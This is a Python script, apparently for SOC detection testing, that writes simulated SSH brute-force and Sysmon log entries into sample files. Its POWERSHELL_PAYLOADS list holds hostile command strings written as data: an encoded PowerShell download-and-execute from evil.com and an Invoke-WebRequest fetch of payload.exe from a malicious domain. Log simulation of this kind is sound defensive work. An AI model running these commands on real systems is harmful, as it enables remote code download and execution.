import os
import time
import json
import random
from datetime import datetime

LOG_DIR = "sample_logs"
AUTH_LOG_PATH = os.path.join(LOG_DIR, "auth.log")
SYSMON_LOG_PATH = os.path.join(LOG_DIR, "sysmon.json")

# Ensure sample log directory exists
os.makedirs(LOG_DIR, exist_ok=True)

# Attacker profiles for simulation
ATTACKER_IPS = ["185.220.101.5", "192.168.1.200", "45.147.229.11", "10.0.0.88"]
TARGET_USERS = ["root", "admin", "postgres", "ubuntu", "administrator"]
COMPUTERS = ["DESKTOP-SOC-01", "SERVER-PROD-02", "WORKSTATION-HR"]

POWERSHELL_PAYLOADS = [
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==",
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -c Get-Process | Where-Object {$_.CPU -gt 100}",
    "C:\\Windows\\System32\\cmd.exe /c powershell.exe -c Invoke-WebRequest -Uri http://malicious-domain.com/payload.exe -OutFile C:\\Users\\Public\\payload.exe"
]


def generate_ssh_bruteforce(count=3):
    """Generates SSH failed password logs matching Linux auth log format."""
    now = datetime.now()
    timestamp_str = now.strftime("%b %d %H:%M:%S")
    ip = random.choice(ATTACKER_IPS)

    print(f"[+] Simulating {count} SSH Brute-Force attempts from {ip}...")

    with open(AUTH_LOG_PATH, "a") as f:
        for _ in range(count):
            user = random.choice(TARGET_USERS)
            port = random.randint(30000, 65000)
            pid = random.randint(1000, 9999)
            
            # Format required by parser.py (raw_log[:15] timestamp + regex pattern)
            log_line = f"{timestamp_str} soc-server sshd[{pid}]: Failed password for {user} from {ip} port {port} ssh2\n"
            f.write(log_line)
            time.sleep(0.2)


def generate_powershell_attack():
    """Generates a suspicious Sysmon process creation event in JSON format."""
    now = datetime.now()
    utc_time = now.strftime("%Y-%m-%d %H:%M:%S.000")
    computer = random.choice(COMPUTERS)
    user = random.choice(["NT AUTHORITY\\SYSTEM", "CORP\\admin_user", "DESKTOP\\local_admin"])
    payload = random.choice(POWERSHELL_PAYLOADS)

    print(f"[+] Simulating Suspicious PowerShell execution on {computer}...")

    sysmon_event = {
        "UtcTime": utc_time,
        "Computer": computer,
        "User": user,
        "Image": payload,
        "ProcessId": str(random.randint(2000, 8000)),
        "CommandLine": payload
    }

    with open(SYSMON_LOG_PATH, "a") as f:
        f.write(json.dumps(sysmon_event) + "\n")


def run_simulation_loop(interval_seconds=5):
    """Continuously injects attack logs into sample_logs/ every few seconds."""
    print("==================================================")
    print("🚀 Attack Log Simulator Started")
    print(f"Target Directory : {LOG_DIR}/")
    print(f"Injection Interval: Every {interval_seconds} seconds")
    print("Press Ctrl+C to stop simulation")
    print("==================================================\n")

    try:
        while True:
            # Alternates between SSH brute force and malicious PowerShell attacks
            attack_type = random.choice(["ssh", "powershell", "both"])

            if attack_type in ["ssh", "both"]:
                generate_ssh_bruteforce(count=random.randint(2, 5))

            if attack_type in ["powershell", "both"]:
                generate_powershell_attack()

            print(f"Waiting {interval_seconds}s before next attack wave...\n")
            time.sleep(interval_seconds)

    except KeyboardInterrupt:
        print("\n[!] Simulation stopped by user.")


if __name__ == "__main__":
    run_simulation_loop(interval_seconds=5)